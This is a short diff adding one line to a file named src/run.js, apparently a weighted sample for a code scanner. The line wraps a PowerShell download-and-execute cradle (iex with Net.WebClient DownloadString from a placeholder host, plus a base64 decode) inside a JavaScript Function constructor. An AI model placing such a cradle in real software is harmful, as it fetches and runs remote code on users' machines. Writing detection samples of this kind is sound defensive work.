@@ -1,0 +1,5 @@
+# path: src/run.js
+# lines: 1
+# weight: 45
+# ---
+const x = new Function(/iex (New-Object Net.WebClient).DownloadString("http://gitray.invalid/a") frombase64string/.source);
